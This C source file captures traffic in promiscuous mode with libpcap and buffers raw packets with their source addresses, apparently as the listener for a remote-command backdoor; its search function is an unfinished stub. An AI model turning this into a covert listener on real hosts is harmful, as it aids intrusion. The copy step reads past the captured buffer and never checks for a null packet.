// Copyright © 2022 Kris Nóva <kris@nivenly.com>
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// ███╗   ██╗ ██████╗ ██╗   ██╗ █████╗
// ████╗  ██║██╔═████╗██║   ██║██╔══██╗
// ██╔██╗ ██║██║██╔██║██║   ██║███████║
// ██║╚██╗██║████╔╝██║╚██╗ ██╔╝██╔══██║
// ██║ ╚████║╚██████╔╝ ╚████╔╝ ██║  ██║
// ╚═╝  ╚═══╝ ╚═════╝   ╚═══╝  ╚═╝  ╚═╝
//
// [dpi.c]

#include <linux/types.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <netinet/ip.h>
#include <pcap.h>
#include <pthread.h>
#include <string.h>
#include <stdlib.h>
// clang-format off
#include "dpi.h"
#include "common.h"
// clang-format on


#define XCAP_BUFFER_SIZE 1024

typedef struct xcap_saddr_packet {
  struct in_addr *saddr;
  unsigned char *packet;
  // TODO add other fields from packet parsing below!
  // TODO consider perfomance hits of packet parsing before/after (probably just do saddr)
} xcap_saddr_packet;

xcap_saddr_packet *xcap_ring_buffer[XCAP_BUFFER_SIZE];
int xcap_pos = 0;
int xcap_collect = 1;
pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;

void *xcap(void *v_dev_name) {
  char *dev_name = (char *)v_dev_name;
  boopprintf("  -> Starting xCap Interface  : %s\n", dev_name);
  // Taken from TCPDump

  // TCP Dump filter
  char filter_exp[] = "";

  pcap_t *handle; /* Session handle */

  char errbuf[PCAP_ERRBUF_SIZE]; /* Error string */
  struct bpf_program fp;         /* The compiled filter */
  bpf_u_int32 mask;              /* Our netmask */
  bpf_u_int32 net;               /* Our IP */
  struct pcap_pkthdr header;     /* The header that pcap gives us */
  const u_char *packet;          /* The actual packet */

  /* Find the properties for the device */
  if (pcap_lookupnet(dev_name, &net, &mask, errbuf) == -1) {
    boopprintf("Couldn't get netmask for device %s: %s\n", dev_name, errbuf);
    net = 0;
    mask = 0;
  }

  /* Open the session in promiscuous mode */
  handle = pcap_open_live(dev_name, BUFSIZ, 1, 1000, errbuf);
  if (handle == NULL) {
    boopprintf("Couldn't open device %s: %s\n", dev_name, errbuf);
    return NULL;
  }
  /* Compile and apply the filter */
  if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
    boopprintf("Couldn't parse filter %s: %s\n", filter_exp,
               pcap_geterr(handle));
    return NULL;
  }
  if (pcap_setfilter(handle, &fp) == -1) {
    boopprintf("Couldn't install filter %s: %s\n", filter_exp,
               pcap_geterr(handle));
    return NULL;
  }

  boopprintf("  -> Listening xCap Kernel packets:\n");


  /* Search for RCE */
  boopprintf("--------------------------------------------\n");
  struct ether_header *ep;
  struct ip *iph;
  unsigned short ether_type;
  int cycle = 0;
  while (xcap_collect) {
    packet = pcap_next(handle, &header);
    ep = (struct ether_header *)packet;
    ether_type = ntohs(ep->ether_type);
    u_int len = header.len;
    if (ether_type != ETHERTYPE_IP) {
      continue;
    }
    packet += sizeof(struct ether_header);
    iph = (struct ip *)packet;
    {
      //boopprintf("IP Ver = %d\n", iph->ip_v);
      //boopprintf("IP Header len = %d\n", iph->ip_hl<<2);
      //boopprintf("IP Source Address = %s\n", inet_ntoa(iph->ip_src));
      //boopprintf("IP Dest Address = %s\n", inet_ntoa(iph->ip_dst));
      //boopprintf("IP Packet size = %d\n", len-16);
    }

    if (xcap_pos == XCAP_BUFFER_SIZE) {
      xcap_pos = 0;
      cycle = 1;
    }
    if (cycle) {
      // If we are cycling, free up the previous position
      pthread_mutex_lock(&lock);
      free(xcap_ring_buffer[xcap_pos]->packet);
      free(xcap_ring_buffer[xcap_pos]->saddr);
      free(xcap_ring_buffer[xcap_pos]);
      pthread_mutex_unlock(&lock);
    }

    // Memory set for xpack
    struct xcap_saddr_packet *xpack = malloc(sizeof (xcap_saddr_packet));
    xpack->packet = malloc(header.caplen);
    xpack->saddr = malloc(sizeof (struct in_addr));
    memcpy(xpack->packet, packet, header.caplen);
    memcpy(xpack->saddr, &iph->ip_src, sizeof (struct in_addr));
    pthread_mutex_lock(&lock);
    xcap_ring_buffer[xcap_pos] = xpack;
    pthread_mutex_unlock(&lock);
    xcap_pos++;
    // ------------------------------------------------------

  }
  return NULL;
}

// xcaprce is the main "interface" for pulling an RCE
// out of the kernel.
//
// Different implementations may exist, for the first example
// we are just using pcap.h
int xcaprce(char search[INET_ADDRSTRLEN], char *rce) {
  // Todo setup in_addr structs as needed
  boopprintf("  -> Search xCap Ring Buffer: %s\n", search);
  return 1;
  // return 0; // When we found our RCE!
}
